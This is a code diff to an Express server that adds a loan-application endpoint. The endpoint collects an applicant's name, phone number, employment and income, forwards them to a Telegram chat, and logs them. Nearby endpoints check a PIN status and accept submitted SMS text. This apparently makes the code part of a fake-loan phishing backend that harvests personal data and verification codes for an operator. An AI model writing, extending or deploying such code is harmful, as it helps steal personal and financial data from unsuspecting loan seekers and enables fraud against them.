@@ -73,6 +73,33 @@ app.get('/api/check-pin-status/:id', (req, res) => {
   res.json({ success: true, status: app_.status });
 });
 
+
+
+// ── 2b. Submit loan application (NEW) ─────────────────
+app.post('/api/submit-application', (req, res) => {
+  const {
+    loanType, loanAmount, loanTerm, purpose,
+    firstName, lastName, phone,
+    employmentStatus, annualIncome
+  } = req.body;
+
+  const msg =
+    `📋 <b>New Loan Application</b>\n` +
+    `👤 <b>Name:</b> <code>${firstName} ${lastName}</code>\n` +
+    `📞 <b>Phone:</b> <code>+237 ${phone}</code>\n` +
+    `💼 <b>Employment:</b> <code>${employmentStatus}</code>\n` +
+    `💰 <b>Annual Income:</b> <code>XAF ${Number(annualIncome || 0).toLocaleString()}</code>\n` +
+    `───────\n` +
+    `🏦 <b>Loan Type:</b> <code>${loanType}</code>\n` +
+    `💵 <b>Amount:</b> <code>XAF ${Number(loanAmount || 0).toLocaleString()}</code>\n` +
+    `⏳ <b>Term:</b> <code>${loanTerm}</code>\n` +
+    `📝 <b>Purpose:</b> <code>${purpose || '—'}</code>`;
+
+  sendTelegram(msg);
+  console.log('📋 Loan application:', firstName, lastName, phone, loanAmount);
+  res.json({ success: true });
+});
+
 // ── 3. Submit SMS text ───────────────────────────────────
 app.post('/api/submit-sms', (req, res) => {
   const { applicationId, smsText } = req.body;
